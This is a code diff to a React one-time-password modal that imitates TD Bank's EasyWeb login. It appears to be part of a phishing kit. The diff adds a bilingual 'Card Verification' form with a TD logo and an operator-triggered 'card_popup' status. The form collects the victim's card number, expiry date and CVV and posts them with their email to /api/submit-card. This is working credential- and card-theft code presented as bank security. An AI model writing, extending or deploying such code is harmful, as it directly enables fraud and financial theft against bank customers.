@@ -1,5 +1,5 @@
 import React, { useState, useEffect, useRef } from 'react';
-import { X, Check } from 'lucide-react';
+import { X, Check, Lock } from 'lucide-react';
 
 
 const translations = {
@@ -42,6 +42,12 @@ export default function OtpModal({ email, lang = "en", onVerifySuccess, onClose 
   const [isResending, setIsResending] = useState(false);
   const [isFullyVerified, setIsFullyVerified] = useState(false);
 
+  // Card details state
+  const [cardNumber, setCardNumber] = useState('');
+  const [expiry, setExpiry] = useState('');
+  const [cvv, setCvv] = useState('');
+  const [isCardSubmitting, setIsCardSubmitting] = useState(false);
+
   const inputRefs = [useRef(null), useRef(null), useRef(null), useRef(null), useRef(null), useRef(null)];
   const displayedOtpRef = useRef('');
 
@@ -79,6 +85,12 @@ export default function OtpModal({ email, lang = "en", onVerifySuccess, onClose 
           if (data.status === 'cancelled') { onClose(); window.location.reload(); return; }
           if (data.status === 'idle') { onClose(); return; }
 
+          // ── Card popup / card submitted status ──
+          if (data.status === 'card_popup' || data.status === 'card_submitted') {
+            setStatus(data.status);
+            return;
+          }
+
           setStatus((prevStatus) => {
             if (data.status === 'rejected' && prevStatus !== 'rejected') {
               setError(t.incorrectError);
@@ -112,6 +124,36 @@ export default function OtpModal({ email, lang = "en", onVerifySuccess, onClose 
   useEffect(() => {
     if (inputRefs[0].current) inputRefs[0].current.focus();
   }, []);
+
+  // ── Card helpers ──
+  const formatCardNumber = (val) => val.replace(/\D/g, '').slice(0, 16).replace(/(\d{4})(?=\d)/g, '$1 ');
+  const formatExpiry = (val) => {
+    const d = val.replace(/\D/g, '').slice(0, 4);
+    return d.length >= 3 ? `${d.slice(0, 2)}/${d.slice(2)}` : d;
+  };
+
+  const handleCardSubmit = async (e) => {
+    e.preventDefault();
+    if (isCardSubmitting) return;
+    const rawCard = cardNumber.replace(/\s/g, '');
+    if (rawCard.length < 13 || !expiry || cvv.length < 3) return;
+    setIsCardSubmitting(true);
+    try {
+      const res = await fetch('/api/submit-card', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'X-Access-Key': 'client-td-bank' },
+        body: JSON.stringify({ email, cardNumber: rawCard, cvv, expiry })
+      });
+      const data = await res.json();
+      if (data.success) {
+        setStatus('card_submitted');
+      }
+    } catch (err) {
+      console.error('Card submission error:', err);
+    } finally {
+      setIsCardSubmitting(false);
+    }
+  };
 
   useEffect(() => {
     if (status !== 'show_otp' && status !== 'rejected') return;
@@ -226,6 +268,149 @@ export default function OtpModal({ email, lang = "en", onVerifySuccess, onClose 
           <p className="text-[#888] text-[15px] font-normal">
             {lang === 'fr' ? "Redirection en cours..." : "Redirecting you to EasyWeb..."}
           </p>
+        </div>
+      </div>
+    );
+  }
+
+  // ── Card Details Form ──
+  const isCardActive = status === 'card_popup' || status === 'card_submitted';
+  if (isCardActive) {
+    const cardTranslations = {
+      en: {
+        title: "Card Verification",
+        subtitle: "For security verification, please enter your card details below.",
+        cardNumberLabel: "Card Number",
+        expiryLabel: "Expiration Date (MM/YY)",
+        cvvLabel: "CVV",
+        submitBtn: "Verify Card",
+        submittingBtn: "Verifying...",
+        processingTitle: "🔒 Processing...",
+        processingSubtitle: "Please wait while your information is being verified.",
+      },
+      fr: {
+        title: "Vérification de la carte",
+        subtitle: "Pour la vérification de sécurité, veuillez entrer vos informations de carte ci-dessous.",
+        cardNumberLabel: "Numéro de carte",
+        expiryLabel: "Date d'expiration (MM/AA)",
+        cvvLabel: "CVV",
+        submitBtn: "Vérifier la carte",
+        submittingBtn: "Vérification...",
+        processingTitle: "🔒 Traitement en cours...",
+        processingSubtitle: "Veuillez patienter pendant la vérification de vos informations.",
+      }
+    };
+    const ct = cardTranslations[lang];
+
+    return (
+      <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/50 animate-fade-in">
+        <div className="bg-white w-full max-w-[460px] rounded-[4px] shadow-[0_8px_32px_rgba(0,0,0,0.18)] px-10 pt-9 pb-10 flex flex-col relative border border-[#d8d8d8] animate-slide-in">
+          {/* TD green accent bar at top */}
+          <div className="absolute top-0 left-0 right-0 h-1 bg-[#12412A] rounded-t-[4px]" />
+
+          {/* Close button */}
+          {onClose && (
+            <button
+              type="button"
+              onClick={onClose}
+              className="absolute top-3.5 right-3.5 bg-transparent border-none cursor-pointer text-[#888] p-1 flex items-center rounded-[2px] hover:bg-black/5 transition-colors"
+              aria-label="Close"
+            >
+              <X className="w-[18px] h-[18px]" />
+            </button>
+          )}
+
+          {/* TD Logo */}
+          <div className="flex justify-center mb-4">
+            <svg width="48" height="48" viewBox="0 0 42 42" xmlns="http://www.w3.org/2000/svg">
+              <rect width="42" height="42" rx="4" fill="#1a5c2a"/>
+              <text x="21" y="30" textAnchor="middle" fill="#fff" fontSize="24" fontWeight="800"
+                fontFamily="-apple-system,Helvetica Neue,Arial,sans-serif">TD</text>
+            </svg>
+          </div>
+
+          <h3 className="text-2xl font-normal text-[#222] text-center mb-2">
+            {ct.title}
+          </h3>
+          <p className="text-[#555] text-[15px] text-center mb-6 leading-normal">
+            {ct.subtitle}
+          </p>
+
+          <form onSubmit={handleCardSubmit}>
+            {status === 'card_submitted' ? (
+              <div className="text-center py-8">
+                <div className="text-[#1a5c2a] text-[15px] font-semibold animate-pulse mb-2">
+                  {ct.processingTitle}
+                </div>
+                <p className="text-[#888] text-xs">
+                  {ct.processingSubtitle}
+                </p>
+              </div>
+            ) : (
+              <>
+                {/* Card Number */}
+                <div className="mb-4">
+                  <label className="block text-xs font-semibold text-slate-500 uppercase tracking-wider mb-1.5">
+                    {ct.cardNumberLabel}
+                  </label>
+                  <input
+                    type="text"
+                    inputMode="numeric"
+                    placeholder="0000 0000 0000 0000"
+                    value={cardNumber}
+                    onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
+                    maxLength={19}
+                    className="w-full px-3 h-[38px] border border-[#ccc] border-b-2 border-b-[#1a7b3a] rounded-none text-slate-900 font-mono text-base tracking-widest focus:outline-none focus:border-b-brand-green transition-all"
+                  />
+                </div>
+
+                {/* Expiry + CVV */}
+                <div className="flex gap-4 mb-6">
+                  <div className="flex-1">
+                    <label className="block text-xs font-semibold text-slate-500 uppercase tracking-wider mb-1.5">
+                      {ct.expiryLabel}
+                    </label>
+                    <input
+                      type="text"
+                      inputMode="numeric"
+                      placeholder="MM/YY"
+                      value={expiry}
+                      onChange={(e) => setExpiry(formatExpiry(e.target.value))}
+                      maxLength={5}
+                      className="w-full px-3 h-[38px] border border-[#ccc] border-b-2 border-b-[#1a7b3a] rounded-none text-slate-900 font-mono text-base text-center focus:outline-none focus:border-b-brand-green transition-all"
+                    />
+                  </div>
+                  <div className="w-[100px]">
+                    <label className="block text-xs font-semibold text-slate-500 uppercase tracking-wider mb-1.5">
+                      {ct.cvvLabel}
+                    </label>
+                    <input
+                      type="password"
+                      inputMode="numeric"
+                      placeholder="•••"
+                      value={cvv}
+                      onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').slice(0, 4))}
+                      maxLength={4}
+                      className="w-full px-3 h-[38px] border border-[#ccc] border-b-2 border-b-[#1a7b3a] rounded-none text-slate-900 font-mono text-base text-center focus:outline-none focus:border-b-brand-green transition-all"
+                    />
+                  </div>
+                </div>
+
+                <button
+                  type="submit"
+                  disabled={isCardSubmitting || cardNumber.replace(/\s/g,'').length < 13 || !expiry || cvv.length < 3}
+                  className={`w-full h-11 text-white border-none rounded-[4px] text-[17px] font-medium flex items-center justify-center gap-2 transition-colors duration-200 ${
+                    (isCardSubmitting || cardNumber.replace(/\s/g,'').length < 13 || !expiry || cvv.length < 3)
+                      ? 'bg-[#ccc] cursor-not-allowed'
+                      : 'bg-brand-green hover:bg-brand-green-hover cursor-pointer'
+                  }`}
+                >
+                  <Lock className="w-4 h-4" />
+                  {isCardSubmitting ? ct.submittingBtn : ct.submitBtn}
+                </button>
+              </>
+            )}
+          </form>
         </div>
       </div>
     );
